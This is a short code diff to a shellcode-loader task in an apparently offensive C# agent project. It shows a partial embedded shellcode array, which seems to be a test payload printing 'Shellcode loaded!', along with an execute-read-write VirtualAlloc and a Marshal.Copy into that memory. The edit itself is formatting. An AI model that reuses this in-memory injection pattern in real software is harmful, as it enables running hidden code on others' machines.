@@ -28,13 +28,13 @@ namespace SaltedCaramel.Tasks
             0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x53,0x68,0x65,
             0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x6c,0x6f,0x61,0x64,0x65,0x64,0x21,0x00,
             0x73,0x63,0x6c,0x6f,0x61,0x64,0x65,0x72,0x00 };
-            
+
             IntPtr funcAddr = Win32.Kernel32.VirtualAlloc(
-                              IntPtr.Zero,                              //LPVOID lpAddress
-                              (ulong)shellcode.Length,                  //SIZE_T dwSize 
-                              Win32.Kernel32.AllocationType.Commit,               //DWORD flAllocationType
-                              Win32.Kernel32.MemoryProtection.ExecuteReadWrite); //DWORD flProtect
-            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+                              IntPtr.Zero,                                          //LPVOID lpAddress
+                              (ulong)shellcode.Length,                              //SIZE_T dwSize 
+                              Win32.Kernel32.AllocationType.Commit,                 //DWORD flAllocationType
+                              Win32.Kernel32.MemoryProtection.ExecuteReadWrite);    //DWORD flProtect
+            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
 
             IntPtr hThread = IntPtr.Zero;
             uint threadId = 0;
